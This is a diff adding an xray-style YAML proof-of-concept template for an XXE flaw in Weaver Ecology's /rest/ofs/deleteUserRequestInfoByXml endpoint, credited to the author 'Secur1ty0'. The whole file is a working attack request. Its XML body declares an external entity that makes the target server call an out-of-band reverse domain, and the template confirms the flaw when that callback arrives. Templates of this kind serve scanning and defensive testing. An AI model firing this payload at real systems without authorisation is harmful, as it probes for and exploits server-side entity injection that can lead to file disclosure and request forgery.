@@ -1,0 +1,28 @@
+name: poc-yaml-ecology-deleteuserrequestinfobyxml-xxe
+transport: http
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /rest/ofs/deleteUserRequestInfoByXml
+      follow_redirects: false
+      headers:
+        Content-Type: application/xml
+      body: |-
+        <?xml version="1.0" encoding="utf-8" ?>
+        <!DOCTYPE test[
+        <!ENTITY
+        bee SYSTEM "http://{{reverseDomain}}">
+        ]>
+        <request>
+        <data>&bee;</data>
+        </request>
+    expression: response.status == 200 && reverse.wait(5)
+expression: r0()
+detail:
+  author: Secur1ty0(https://github.com/Secur1ty0)
+  links:
+    - https://github.com/Secur1ty0
